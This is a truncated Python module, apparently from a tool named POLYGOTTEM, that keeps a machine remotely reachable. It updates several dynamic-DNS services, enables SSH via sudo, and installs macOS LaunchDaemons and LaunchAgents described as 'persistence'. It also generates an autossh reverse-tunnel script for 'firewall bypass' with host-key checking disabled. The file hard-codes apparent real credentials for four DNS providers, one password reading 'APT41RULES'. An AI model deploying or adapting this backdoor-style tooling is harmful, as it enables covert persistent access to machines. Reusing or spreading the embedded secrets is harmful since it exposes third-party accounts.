#!/usr/bin/env python3
"""
DuckDNS Integration for POLYGOTTEM
===================================
Provides dynamic DNS updates and SSH tunnel setup for remote access.

EDUCATIONAL/RESEARCH USE ONLY

Author: SWORDIntel
Date: 2025-11-15
"""

import os
import sys
import socket
import subprocess
import requests
import random
import time
import platform
from typing import Optional, Dict, Tuple, List
from datetime import datetime
from pathlib import Path


def is_macos() -> bool:
    """
    Check if running on macOS

    Returns:
        True if macOS, False otherwise
    """
    return platform.system() == 'Darwin'


def validate_ip_address(ip: str) -> bool:
    """
    Validate IP address format

    Args:
        ip: IP address string to validate

    Returns:
        True if valid IPv4 or IPv6 address
    """
    try:
        # Try IPv4
        socket.inet_aton(ip)
        return True
    except socket.error:
        pass

    try:
        # Try IPv6
        socket.inet_pton(socket.AF_INET6, ip)
        return True
    except socket.error:
        pass

    return False


def verify_dns_resolution(domain: str, expected_ip: str, timeout: int = 10) -> Tuple[bool, Optional[str]]:
    """
    Verify DNS resolution matches expected IP

    Args:
        domain: Domain to check
        expected_ip: Expected IP address
        timeout: Timeout in seconds

    Returns:
        Tuple of (success, resolved_ip)
    """
    try:
        # Wait a moment for DNS propagation
        time.sleep(2)

        # Resolve domain
        resolved_ip = socket.gethostbyname(domain)

        # Compare IPs
        if resolved_ip == expected_ip:
            return True, resolved_ip
        else:
            return False, resolved_ip

    except socket.gaierror:
        return False, None
    except Exception as e:
        return False, None


class DuckDNSIntegration:
    """Manages DuckDNS registration and SSH tunnel setup with validation"""

    @staticmethod
    def generate_random_port() -> int:
        """
        Generate a random non-standard SSH port for security

        Returns:
            Random port between 2000-65000 (avoiding well-known ports)
        """
        return random.randint(2000, 65000)

    def __init__(self, domain: str = "polygottem.duckdns.org",
                 api_token: str = "62414348-fa36-4a8c-8fc2-8b96ef48b3ea",
                 ssh_port: Optional[int] = None,
                 dyndns_domain: Optional[str] = "all.ddnskey.com",
                 dyndns_user: Optional[str] = "47157",
                 dyndns_pass: Optional[str] = "APT41RULES",
                 noip_domain: Optional[str] = "all.ddnskey.com",
                 noip_user: Optional[str] = "3btmnv1",
                 noip_pass: Optional[str] = "vsUre6qPUfWy",
                 namecheap_domain: Optional[str] = "cryptogram.london",
                 namecheap_user: Optional[str] = "SWORDIntel",
                 namecheap_pass: Optional[str] = "a02b3d7b0dcf48918bd2e330744121a4"):
        """
        Initialize DuckDNS integration with DynDNS, No-IP, and Namecheap fallbacks

        DEV MODE: Default credentials are pre-filled for testing.
        IMPORTANT: Change these before production use!

        Args:
            domain: DuckDNS subdomain (e.g., "polygottem.duckdns.org")
            api_token: DuckDNS API token
            ssh_port: SSH server port (None = random non-standard port for security)
            dyndns_domain: DynDNS domain (default: all.ddnskey.com for DEV)
            dyndns_user: DynDNS username (default: 47157 for DEV)
            dyndns_pass: DynDNS password (default: APT41RULES for DEV)
            noip_domain: No-IP domain (default: all.ddnskey.com for DEV)
            noip_user: No-IP username (default: 3btmnv1 for DEV)
            noip_pass: No-IP password (default: vsUre6qPUfWy for DEV)
            namecheap_domain: Namecheap domain (default: cryptogram.london for DEV)
            namecheap_user: Namecheap username (default: SWORDIntel for DEV)
            namecheap_pass: Namecheap password (default: a02b3d7b0dcf48918bd2e330744121a4 for DEV)
        """
        self.domain = domain.replace('.duckdns.org', '')  # Extract subdomain
        self.full_domain = f"{self.domain}.duckdns.org"
        self.api_token = api_token
        # Use random port if not specified (security best practice)
        self.ssh_port = ssh_port if ssh_port is not None else self.generate_random_port()
        self.update_url = f"https://www.duckdns.org/update"
        self.config_file = os.path.expanduser("~/.polygottem_duckdns.conf")
        self.is_macos = is_macos()

        # DynDNS fallback configuration
        self.dyndns_enabled = dyndns_domain is not None
        self.dyndns_domain = dyndns_domain
        self.dyndns_user = dyndns_user
        self.dyndns_pass = dyndns_pass
        self.dyndns_update_url = "https://www.dyndns.org/nic/update"

        # No-IP fallback configuration
        self.noip_enabled = noip_domain is not None
        self.noip_domain = noip_domain
        self.noip_user = noip_user
        self.noip_pass = noip_pass
        self.noip_update_url = "https://dynupdate.no-ip.com/nic/update"

        # Namecheap fallback configuration
        self.namecheap_enabled = namecheap_domain is not None
        self.namecheap_domain = namecheap_domain
        self.namecheap_user = namecheap_user
        self.namecheap_pass = namecheap_pass
        self.namecheap_update_url = "https://dynamicdns.park-your-domain.com/update"

    def enable_macos_remote_login(self) -> bool:
        """
        Enable macOS Remote Login (SSH)

        Returns:
            True if successful or already enabled
        """
        if not self.is_macos:
            return False

        try:
            print("[*] Enabling macOS Remote Login (SSH)...")

            # Check if already enabled
            result = subprocess.run(
                ['sudo', 'systemsetup', '-getremotelogin'],
                capture_output=True,
                text=True
            )

            if 'On' in result.stdout:
                print("✓ Remote Login already enabled")
                return True

            # Enable Remote Login
            result = subprocess.run(
                ['sudo', 'systemsetup', '-setremotelogin', 'on'],
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0:
                print("✓ Remote Login enabled successfully")
                return True
            else:
                print(f"✗ Failed to enable Remote Login: {result.stderr}")
                return False

        except subprocess.TimeoutExpired:
            print("✗ Timeout enabling Remote Login (may require password)")
            return False
        except Exception as e:
            print(f"✗ Error enabling Remote Login: {e}")
            return False

    def generate_launchdaemon_plist(self, script_path: str, label: str = "com.polygottem.sshkeepalive") -> str:
        """
        Generate LaunchDaemon plist for system-wide SSH persistence

        Args:
            script_path: Path to keepalive script
            label: LaunchDaemon label

        Returns:
            Plist XML content
        """
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
    </dict>
    <key>StandardOutPath</key>
    <string>/var/log/{label}.log</string>
    <key>StandardErrorPath</key>
    <string>/var/log/{label}.err</string>
    <key>ProcessType</key>
    <string>Background</string>
    <key>ThrottleInterval</key>
    <integer>60</integer>
</dict>
</plist>'''
        return plist_content

    def generate_launchagent_plist(self, script_path: str, label: str = "com.polygottem.duckdns") -> str:
        """
        Generate LaunchAgent plist for user-level DuckDNS updates

        Args:
            script_path: Path to update script
            label: LaunchAgent label

        Returns:
            Plist XML content
        """
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
    <key>StandardOutPath</key>
    <string>/tmp/{label}.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/{label}.err</string>
    <key>ProcessType</key>
    <string>Background</string>
</dict>
</plist>'''
        return plist_content

    def generate_ssh_keepalive_script(self) -> str:
        """
        Generate SSH keepalive monitoring script

        Returns:
            Bash script content
        """
        if self.is_macos:
            service_check = '''
# Check if SSH is running on macOS
if ! sudo launchctl list | grep -q com.openssh.sshd; then
    echo "$(date): SSH not running, starting..."
    sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist 2>/dev/null || \
    sudo systemsetup -setremotelogin on
fi
'''
        else:
            service_check = '''
# Check if SSH is running on Linux
if ! systemctl is-active --quiet ssh && ! systemctl is-active --quiet sshd; then
    echo "$(date): SSH not running, starting..."
    sudo systemctl start ssh 2>/dev/null || sudo systemctl start sshd
fi
'''

        script_content = f'''#!/bin/bash
# SSH Keepalive Script for POLYGOTTEM
# Monitors and restarts SSH service if needed

LOG_FILE="/var/log/ssh_keepalive.log"

# Logging function
log() {{
    echo "$(date '+%Y-%m-%d %H:%M:%S'): $1" | tee -a "$LOG_FILE"
}}

log "SSH keepalive check starting..."

{service_check}

# Check if SSH port {self.ssh_port} is listening
if ! netstat -an | grep -q ":{self.ssh_port}.*LISTEN" && ! ss -tln | grep -q ":{self.ssh_port}"; then
    log "Warning: SSH not listening on port {self.ssh_port}"
fi

log "SSH keepalive check complete"
'''
        return script_content

    def generate_reverse_tunnel_script(self, remote_host: str, remote_port: int = 2222,
                                      remote_user: str = "tunnel") -> str:
        """
        Generate reverse SSH tunnel script with autossh

        Args:
            remote_host: Remote server for tunnel
            remote_port: Remote port for reverse tunnel
            remote_user: Remote username

        Returns:
            Bash script content
        """
        script_content = f'''#!/bin/bash
# Reverse SSH Tunnel Script for POLYGOTTEM
# Establishes persistent reverse tunnel for NAT/firewall bypass

REMOTE_HOST="{remote_host}"
REMOTE_PORT={remote_port}
REMOTE_USER="{remote_user}"
LOCAL_PORT={self.ssh_port}
MONITOR_PORT=20000

LOG_FILE="/var/log/reverse_tunnel.log"

# Logging function
log() {{
    echo "$(date '+%Y-%m-%d %H:%M:%S'): $1" | tee -a "$LOG_FILE"
}}

log "Starting reverse SSH tunnel..."

# Kill existing autossh processes
pkill -f "autossh.*$REMOTE_PORT"

# Check if autossh is installed
if ! command -v autossh &> /dev/null; then
    log "Error: autossh not installed"
{"    # macOS installation" if self.is_macos else "    # Linux installation"}
{"    brew install autossh" if self.is_macos else "    sudo apt-get install -y autossh || sudo yum install -y autossh"}
fi

# Start reverse tunnel with autossh
export AUTOSSH_POLL=60
export AUTOSSH_LOGFILE="$LOG_FILE"

autossh -M $MONITOR_PORT \\
    -f -N \\
    -o "ServerAliveInterval=30" \\
    -o "ServerAliveCountMax=3" \\
    -o "ExitOnForwardFailure=yes" \\
    -o "StrictHostKeyChecking=no" \\
    -R $REMOTE_PORT:localhost:$LOCAL_PORT \\
    $REMOTE_USER@$REMOTE_HOST

if [ $? -eq 0 ]; then
    log "Reverse tunnel established: $REMOTE_HOST:$REMOTE_PORT -> localhost:$LOCAL_PORT"
else
    log "Failed to establish reverse tunnel"
    exit 1
fi
'''
        return script_content

    def install_macos_persistence(self, remote_host: Optional[str] = None) -> bool:
        """
        Install complete macOS persistence (LaunchDaemons + LaunchAgents + Reverse Tunnel)

        Args:
            remote_host: Optional remote host for reverse SSH tunnel

        Returns:
            True if installation successful
        """
        if not self.is_macos:
            print("⚠ Not running on macOS, skipping macOS-specific persistence")
            return False

        try:
            print("\n" + "="*70)
            print("Installing macOS Persistence")
            print("="*70 + "\n")

            success_count = 0
            total_tasks = 3 if remote_host else 2

            # 1. Install SSH keepalive LaunchDaemon
            print("[1/{}] Installing SSH keepalive LaunchDaemon...".format(total_tasks))

            keepalive_script_path = "/usr/local/bin/ssh_keepalive.sh"
            keepalive_script = self.generate_ssh_keepalive_script()

            try:
                # Write keepalive script
                subprocess.run(
                    ['sudo', 'tee', keepalive_script_path],
                    input=keepalive_script.encode(),
                    capture_output=True,
                    check=True
                )
                subprocess.run(['sudo', 'chmod', '+x', keepalive_script_path], check=True)

                # Write LaunchDaemon plist
                daemon_plist = self.generate_launchdaemon_plist(keepalive_script_path)
                daemon_plist_path = "/Library/LaunchDaemons/com.polygottem.sshkeepalive.plist"

                subprocess.run(
                    ['sudo', 'tee', daemon_plist_path],
                    input=daemon_plist.encode(),
                    capture_output=True,
                    check=True
                )

                # Load LaunchDaemon
                subprocess.run(
                    ['sudo', 'launchctl', 'load', '-w', daemon_plist_path],
                    capture_output=True,
                    check=True
                )

                print(f"✓ SSH keepalive LaunchDaemon installed: {daemon_plist_path}")
                success_count += 1
            except Exception as e:
                print(f"✗ Failed to install SSH keepalive: {e}")

            # 2. Install DuckDNS update LaunchAgent
            print("\n[2/{}] Installing DuckDNS LaunchAgent...".format(total_tasks))

            duckdns_script_path = os.path.expanduser("~/bin/duckdns_update.sh")
            os.makedirs(os.path.dirname(duckdns_script_path), exist_ok=True)

            duckdns_script = f'''#!/bin/bash
# DuckDNS Auto-Update Script
python3 {os.path.abspath(__file__)} --update
'''

            try:
                with open(duckdns_script_path, 'w') as f:
                    f.write(duckdns_script)
                os.chmod(duckdns_script_path, 0o755)

                # Write LaunchAgent plist
                agent_plist = self.generate_launchagent_plist(duckdns_script_path)
                agent_plist_path = os.path.expanduser("~/Library/LaunchAgents/com.polygottem.duckdns.plist")
                os.makedirs(os.path.dirname(agent_plist_path), exist_ok=True)

                with open(agent_plist_path, 'w') as f:
                    f.write(agent_plist)

                # Load LaunchAgent
                subprocess.run(
                    ['launchctl', 'load', '-w', agent_plist_path],
                    capture_output=True,
                    check=True
                )

                print(f"✓ DuckDNS LaunchAgent installed: {agent_plist_path}")
                print(f"  Updates every 5 minutes")
                success_count += 1
            except Exception as e:
                print(f"✗ Failed to install DuckDNS LaunchAgent: {e}")

            # 3. Install reverse tunnel (optional)
            if remote_host:
                print(f"\n[3/{total_tasks}] Installing reverse SSH tunnel...")

                tunnel_script_path = "/usr/local/bin/reverse_tunnel.sh"
                tunnel_script = self.generate_reverse_tunnel_script(remote_host)

                try:
                    subprocess.run(
                        ['sudo', 'tee', tunnel_script_path],
                        input=tunnel_script.encode(),
                        capture_output=True,
                        check=True
                    )
                    subprocess.run(['sudo', 'chmod', '+x', tunnel_script_path], check=True)

                    # Create LaunchDaemon for tunnel
                    tunnel_plist = self.generate_launchdaemon_plist(
                        tunnel_script_path,
                        "com.polygottem.reversetunnel"
                    )
                    tunnel_plist_path = "/Library/LaunchDaemons/com.polygottem.reversetunnel.plist"

                    subprocess.run(
                        ['sudo', 'tee', tunnel_plist_path],
                        input=tunnel_plist.encode(),
                        capture_output=True,
                        check=True
                    )

                    # Load tunnel daemon
                    subprocess.run(
                        ['sudo', 'launchctl', 'load', '-w', tunnel_plist_path],
                        capture_output=True,
                        check=True
                    )

                    print(f"✓ Reverse tunnel LaunchDaemon installed: {tunnel_plist_path}")
                    print(f"  Tunnel: {remote_host}:2222 -> localhost:{self.ssh_port}")
                    success_count += 1
                except Exception as e:
                    print(f"✗ Failed to install reverse tunnel: {e}")

            print("\n" + "="*70)
            print(f"Installation Complete: {success_count}/{total_tasks} components installed")
            print("="*70 + "\n")

            return success_count > 0

        except Exception as e:
            print(f"✗ Error installing macOS persistence: {e}")
            return False

    def get_public_ip(self) -> Optional[str]:
        """
        Get current public IP address

        Returns:
            Public IP address or None if failed
        """
        try:
            # Try multiple IP detection services
            services = [
                "https://api.ipify.org",
                "https://ifconfig.me/ip",
                "https://icanhazip.com"
            ]

            for service in services:
                try:
                    response = requests.get(service, timeout=5)
                    if response.status_code == 200:
                        return response.text.strip()
                except:
                    continue

            return None

        except Exception as e:
            print(f"Error getting public IP: {e}")
            return None

    def update_dyndns(self, ip: Optional[str] = None, max_retries: int = 3) -> bool:
        """
        Update DynDNS with current IP (fallback option)

        Args:
            ip: IP address to register (auto-detect if None)
            max_retries: Number of retry attempts for failed updates

        Returns:
            True if update successful, False otherwise
        """
        if not self.dyndns_enabled:
            return False

        try:
            # Get IP if not provided
            if ip is None:
                ip = self.get_public_ip()
                if ip is None:
                    print("✗ Failed to detect public IP for DynDNS update")
                    return False

            # Validate IP address format
            if not validate_ip_address(ip):
                print(f"✗ Invalid IP address format for DynDNS: {ip}")
                return False

            # Attempt update with retries
            for attempt in range(1, max_retries + 1):
                try:
                    # DynDNS uses HTTP Basic Auth
                    from requests.auth import HTTPBasicAuth

                    params = {'myip': ip}

                    print(f"[*] Sending update to DynDNS (attempt {attempt}/{max_retries})...")
                    response = requests.get(
                        self.dyndns_update_url,
                        params=params,
                        auth=HTTPBasicAuth(self.dyndns_user, self.dyndns_pass),
                        timeout=10
                    )

                    # Check response
                    if response.status_code not in [200, 400, 401, 403, 404]:
                        print(f"✗ HTTP {response.status_code}: {response.text}")
                        if attempt < max_retries:
                            print(f"[*] Retrying in 3 seconds...")
                            time.sleep(3)
                            continue
                        return False

                    response_text = response.text.strip()

                    # DynDNS response codes
                    if response_text.startswith('good') or response_text.startswith('nochg'):
                        print(f"✓ DynDNS API response: {response_text}")
                        print(f"✓ DynDNS updated: {self.dyndns_domain} → {ip}")
                        return True

                    elif response_text.startswith('badauth'):
                        print(f"✗ DynDNS update failed: Invalid username or password")
                        return False

                    elif response_text.startswith('badagent'):
                        print(f"✗ DynDNS update failed: Bad user agent")
                        return False

                    elif response_text.startswith('notfqdn'):
                        print(f"✗ DynDNS update failed: Invalid domain '{self.dyndns_domain}'")
                        return False

                    elif response_text.startswith('nohost'):
                        print(f"✗ DynDNS update failed: Hostname not found")
                        return False

                    elif response_text.startswith('numhost'):
                        print(f"✗ DynDNS update failed: Too many hosts in one request")
                        return False

                    elif response_text.startswith('abuse'):
                        print(f"✗ DynDNS update failed: Account marked for abuse")
                        return False

                    elif response_text.startswith('911'):
                        print(f"✗ DynDNS update failed: Server error (911)")
                        if attempt < max_retries:
                            print(f"[*] Retrying in 5 seconds...")
                            time.sleep(5)
                            continue
                        return False

                    else:
                        print(f"✗ Unexpected DynDNS response: {response_text}")
                        if attempt < max_retries:
                            print(f"[*] Retrying in 2 seconds...")
                            time.sleep(2)
                            continue
                        return False

                except requests.exceptions.RequestException as e:
                    print(f"✗ Network error updating DynDNS: {e}")
                    if attempt < max_retries:
                        print(f"[*] Retrying in 3 seconds...")
                        time.sleep(3)
                        continue
                    return False

            return False

        except Exception as e:
            print(f"✗ Error updating DynDNS: {e}")
            return False

    def update_noip(self, ip: Optional[str] = None, max_retries: int = 3) -> bool:
        """
        Update No-IP with current IP (third fallback option)

        Args:
            ip: IP address to register (auto-detect if None)
            max_retries: Number of retry attempts for failed updates

        Returns:
            True if update successful, False otherwise
        """
        if not self.noip_enabled:
            return False

        try:
            # Get IP if not provided
            if ip is None:
                ip = self.get_public_ip()
                if ip is None:
                    print("✗ Failed to detect public IP for No-IP update")
                    return False

            # Validate IP address format
            if not validate_ip_address(ip):
                print(f"✗ Invalid IP address format for No-IP: {ip}")
                return False

            # Attempt update with retries
            for attempt in range(1, max_retries + 1):
                try:
                    # No-IP uses HTTP Basic Auth
                    from requests.auth import HTTPBasicAuth

                    params = {
                        'hostname': self.noip_domain,
                        'myip': ip
                    }

                    print(f"[*] Sending update to No-IP (attempt {attempt}/{max_retries})...")
                    response = requests.get(
                        self.noip_update_url,
                        params=params,
                        auth=HTTPBasicAuth(self.noip_user, self.noip_pass),
                        headers={'User-Agent': 'POLYGOTTEM/1.0'},
                        timeout=10
                    )

                    # Check response
                    if response.status_code not in [200, 400, 401, 403, 404]:
                        print(f"✗ HTTP {response.status_code}: {response.text}")
                        if attempt < max_retries:
                            print(f"[*] Retrying in 3 seconds...")
                            time.sleep(3)
                            continue
                        return False

                    response_text = response.text.strip()

                    # No-IP response codes
                    if response_text.startswith('good') or response_text.startswith('nochg'):
                        print(f"✓ No-IP API response: {response_text}")
                        print(f"✓ No-IP updated: {self.noip_domain} → {ip}")
                        return True

                    elif response_text.startswith('badauth'):
                        print(f"✗ No-IP update failed: Invalid username or password")
                        return False

                    elif response_text.startswith('badagent'):
                        print(f"✗ No-IP update failed: Bad user agent")
                        return False

                    elif response_text.startswith('notfqdn'):
                        print(f"✗ No-IP update failed: Invalid domain '{self.noip_domain}'")
                        return False

                    elif response_text.startswith('nohost'):
                        print(f"✗ No-IP update failed: Hostname not found")
                        return False

                    elif response_text.startswith('numhost'):
                        print(f"✗ No-IP update failed: Too many hosts in one request")
                        return False

                    elif response_text.startswith('abuse'):
                        print(f"✗ No-IP update failed: Account marked for abuse")
                        return False

                    elif response_text.startswith('911'):
                        print(f"✗ No-IP update failed: Server error (911)")
                        if attempt < max_retries:
                            print(f"[*] Retrying in 5 seconds...")
                            time.sleep(5)
                            continue
                        return False

                    else:
                        print(f"✗ Unexpected No-IP response: {response_text}")
                        if attempt < max_retries:
                            print(f"[*] Retrying in 2 seconds...")
                            time.sleep(2)
                            continue
                        return False

                except requests.exceptions.RequestException as e:
                    print(f"✗ Network error updating No-IP: {e}")
                    if attempt < max_retries:
                        print(f"[*] Retrying in 3 seconds...")
                        time.sleep(3)
                        continue
                    return False

            return False

        except Exception as e:
            print(f"✗ Error updating No-IP: {e}")
            return False

    def update_namecheap(self, ip: Optional[str] = None, max_retries: int = 3) -> bool:
        """
        Update Namecheap with current IP (fourth fallback option)

        Args:
            ip: IP address to register (auto-detect if None)
            max_retries: Number of retry attempts for failed updates

        Returns:
            True if update successful, False otherwise
        """
        if not self.namecheap_enabled:
            return False

        try:
            # Get IP if not provided
            if ip is None:
                ip = self.get_public_ip()
                if ip is None:
                    print("✗ Failed to detect public IP for Namecheap update")
                    return False

            # Validate IP address format
            if not validate_ip_address(ip):
                print(f"✗ Invalid IP address format for Namecheap: {ip}")
                return False

            # Extract hostname from domain (e.g., "subdomain" from "subdomain.example.com")
            domain_parts = self.namecheap_domain.split('.')
            hostname = domain_parts[0] if len(domain_parts) > 0 else self.namecheap_domain

            # Attempt update with retries
            for attempt in range(1, max_retries + 1):
                try:
                    # Namecheap uses HTTP Basic Auth
                    from requests.auth import HTTPBasicAuth

                    params = {
                        'domain': self.namecheap_domain,
                        'host': hostname,
                        'password': self.namecheap_pass,
                        'ip': ip
                    }

                    print(f"[*] Sending update to Namecheap (attempt {attempt}/{max_retries})...")
                    response = requests.get(
                        self.namecheap_update_url,
                        params=params,
                        timeout=10
                    )

                    # Check response
                    if response.status_code not in [200, 400]:
                        print(f"✗ HTTP {response.status_code}: {response.text}")
                        if attempt < max_retries:
                            print(f"[*] Retrying in 3 seconds...")
                            time.sleep(3)
                            continue
                        return False

                    response_text = response.text.strip()

                    # Namecheap returns XML, check for success
                    if '<ErrCount>0</ErrCount>' in response_text:
                        print(f"✓ Namecheap API response: Success")
                        print(f"✓ Namecheap updated: {self.namecheap_domain} → {ip}")
                        return True

                    elif 'Invalid domain' in response_text or 'Invalid host' in response_text:
                        print(f"✗ Namecheap update failed: Invalid domain or host")
                        return False

                    elif 'Invalid password' in response_text:
                        print(f"✗ Namecheap update failed: Invalid password")
                        return False

                    elif 'Blacklisted IP' in response_text:
                        print(f"✗ Namecheap update failed: IP is blacklisted")
                        return False

                    else:
                        print(f"✗ Unexpected Namecheap response: {response_text[:100]}")
                        if attempt < max_retries:
                            print(f"[*] Retrying in 2 seconds...")
                            time.sleep(2)
                            continue
                        return False

                except requests.exceptions.RequestException as e:
                    print(f"✗ Network error updating Namecheap: {e}")
                    if attempt < max_retries:
                        print(f"[*] Retrying in 3 seconds...")
                        time.sleep(3)
                        continue
                    return False

            return False

        except Exception as e:
            print(f"✗ Error updating Namecheap: {e}")
            return False

    def update_duckdns(self, ip: Optional[str] = None, verify: bool = True, max_retries: int = 3) -> bool:
        """
        Update DuckDNS with current IP (with validation and verification)
        Falls back to DynDNS → No-IP → Namecheap if DuckDNS fails

        Args:
            ip: IP address to register (auto-detect if None)
            verify: Verify DNS resolution after update
            max_retries: Number of retry attempts for failed updates

        Returns:
            True if update successful and verified, False only if all options exhausted
        """
        try:
            # Get IP if not provided
            if ip is None:
                print("[*] Detecting public IP...")
                ip = self.get_public_ip()
                if ip is None:
                    print("✗ Failed to detect public IP")
                    return False

            # Validate IP address format
            if not validate_ip_address(ip):
                print(f"✗ Invalid IP address format: {ip}")
                return False

            print(f"[*] Validated IP: {ip}")

            # Attempt DuckDNS update with retries
            duckdns_success = False
            for attempt in range(1, max_retries + 1):
                try:
                    # Update DuckDNS
                    params = {
                        'domains': self.domain,
                        'token': self.api_token,
                        'ip': ip
                    }

                    print(f"[*] Sending update to DuckDNS (attempt {attempt}/{max_retries})...")
                    response = requests.get(self.update_url, params=params, timeout=10)

                    # Check response
                    if response.status_code != 200:
                        print(f"✗ HTTP {response.status_code}: {response.text}")
                        if attempt < max_retries:
                            print(f"[*] Retrying in 2 seconds...")
                            time.sleep(2)
                            continue
                        break

                    response_text = response.text.strip()

                    # DuckDNS returns 'OK' on success, 'KO' on failure
                    if response_text == 'OK':
                        print(f"✓ DuckDNS API response: OK")
                        print(f"✓ DuckDNS updated: {self.full_domain} → {ip}")

                        # Verify DNS resolution
                        if verify:
                            print(f"[*] Verifying DNS resolution...")
                            success, resolved_ip = verify_dns_resolution(self.full_domain, ip)

                            if success:
                                print(f"✓ DNS verified: {self.full_domain} resolves to {resolved_ip}")
                                return True
                            else:
                                if resolved_ip:
                                    print(f"⚠ DNS mismatch: Expected {ip}, got {resolved_ip}")
                                    print(f"  This may be a cached DNS entry - wait 60s and verify manually")
                                else:
                                    print(f"⚠ DNS resolution failed - may take time to propagate")
                                    print(f"  Verify manually: nslookup {self.full_domain}")

                                # Still return True if API said OK (DNS propagation can be slow)
                                return True
                        else:
                            return True

                    elif response_text == 'KO':
                        print(f"✗ DuckDNS update failed: API returned 'KO'")
                        print(f"  Possible causes:")
                        print(f"  - Invalid token")
                        print(f"  - Invalid domain")
                        print(f"  - Rate limit exceeded")
                        if attempt < max_retries:
                            print(f"[*] Retrying in 5 seconds...")
                            time.sleep(5)
                            continue
                        break

                    else:
                        print(f"✗ Unexpected response: {response_text}")
                        if attempt < max_retries:
                            print(f"[*] Retrying in 2 seconds...")
                            time.sleep(2)
                            continue
                        break

                except requests.exceptions.RequestException as e:
                    print(f"✗ Network error: {e}")
                    if attempt < max_retries:
                        print(f"[*] Retrying in 3 seconds...")
                        time.sleep(3)
                        continue
                    break

            # If DuckDNS failed, try fallback services in order
            if self.dyndns_enabled:
                print("\n[*] DuckDNS update failed, attempting DynDNS fallback...")
                print("-" * 70)
                if self.update_dyndns(ip=ip, max_retries=max_retries):
                    return True
                print("-" * 70)

            # If DynDNS also failed, try No-IP
            if self.noip_enabled:
                print("\n[*] DynDNS update failed, attempting No-IP fallback...")
                print("-" * 70)
                if self.update_noip(ip=ip, max_retries=max_retries):
                    return True
                print("-" * 70)

            # If No-IP also failed, try Namecheap
            if self.namecheap_enabled:
                print("\n[*] No-IP update failed, attempting Namecheap fallback...")
                print("-" * 70)
                if self.update_namecheap(ip=ip, max_retries=max_retries):
                    return True
                print("-" * 70)

            return False

        except Exception as e:
            print(f"✗ Error updating DNS: {e}")
            return False

    def setup_ssh_server(self, port: Optional[int] = None) -> bool:
        """
        Ensure SSH server is running and configured

        Args:
            port: SSH port (uses self.ssh_port if not specified)

        Returns:
            True if SSH is running, False otherwise
        """
        if port is None:
            port = self.ssh_port

        try:
            # macOS-specific SSH handling
            if self.is_macos:
                return self.enable_macos_remote_login()

            # Linux SSH handling
            # Check if SSH server is running
            result = subprocess.run(
                ['systemctl', 'is-active', 'ssh'],
                capture_output=True,
                text=True
            )

            service_name = None
            if result.returncode == 0 and result.stdout.strip() == 'active':
                service_name = 'ssh'
            else:
                # Try sshd
                result = subprocess.run(
                    ['systemctl', 'is-active', 'sshd'],
                    capture_output=True,
                    text=True
                )
                if result.returncode == 0 and result.stdout.strip() == 'active':
                    service_name = 'sshd'

            if service_name:
                print(f"✓ SSH server is running ({service_name})")

                # Verify port is listening
                if self._verify_ssh_port(port):
                    print(f"✓ SSH listening on port {port}")
                    return True
                else:
                    print(f"⚠ SSH running but not listening on port {port}")
                    if port != 22:
                        print(f"  Note: Custom port {port} may require configuration")
                    return True  # Still return True if service is running

            # Try to start SSH server
            print("⚠ SSH server not running, attempting to start...")
            for service in ['ssh', 'sshd']:
                try:
                    subprocess.run(
                        ['sudo', 'systemctl', 'start', service],
                        check=True,
                        capture_output=True
                    )
                    print(f"✓ SSH server started ({service})")

                    # Enable on boot
                    try:
                        subprocess.run(
                            ['sudo', 'systemctl', 'enable', service],
                            check=False,
                            capture_output=True
                        )
                    except:
                        pass

                    return True
                except:
                    continue

            print("✗ Could not start SSH server")
            print("  Manual start required: sudo systemctl start ssh")
            return False

        except Exception as e:
            print(f"Error checking SSH server: {e}")
            return False

    def _verify_ssh_port(self, port: int) -> bool:
        """
        Verify SSH is listening on specified port

        Args:
            port: Port to check

        Returns:
            True if port is listening
        """
        try:
            # Use ss or netstat to check port
            result = subprocess.run(
                ['ss', '-tln'],
                capture_output=True,
                text=True
            )

            if result.returncode == 0:
                # Check if port is in output
                return f':{port}' in result.stdout

            # Fallback to netstat
            result = subprocess.run(
                ['netstat', '-tln'],
                capture_output=True,
                text=True
            )

            if result.returncode == 0:
                return f':{port}' in result.stdout

            return False
        except:
            return False

    def get_ssh_connection_info(self) -> Dict[str, str]:
        """
        Get SSH connection information

        Returns:
            Dictionary with connection details
        """
        try:
            # Get current username
            username = os.getenv('USER', 'unknown')

            # Get public IP
            public_ip = self.get_public_ip()

            # Build connection string with port
            if self.ssh_port != 22:
                connection_string = f"ssh -p {self.ssh_port} {username}@{self.full_domain}"
            else:
                connection_string = f"ssh {username}@{self.full_domain}"

            info = {
                'domain': self.full_domain,
                'ip': public_ip or 'Unknown',
                'username': username,
                'port': str(self.ssh_port),
                'connection_string': connection_string,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }

            return info

        except Exception as e:
            print(f"Error getting SSH info: {e}")
            return {}

    def save_configuration(self) -> bool:
        """
        Save current configuration to file

        Returns:
            True if successful
        """
        try:
            config = {
                'domain': self.full_domain,
                'port': self.ssh_port,
                'last_ip': self.get_public_ip(),
                'last_update': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }

            with open(self.config_file, 'w') as f:
                for key, value in config.items():
                    f.write(f"{key}={value}\n")

            return True
        except Exception as e:
            print(f"⚠ Could not save configuration: {e}")
            return False

    def load_configuration(self) -> Dict[str, str]:
        """
        Load saved configuration

        Returns:
            Configuration dictionary
        """
        try:
            if not os.path.exists(self.config_file):
                return {}

            config = {}
            with open(self.config_file, 'r') as f:
                for line in f:
                    if '=' in line:
                        key, value = line.strip().split('=', 1)
                        config[key] = value

            return config
        except Exception as e:
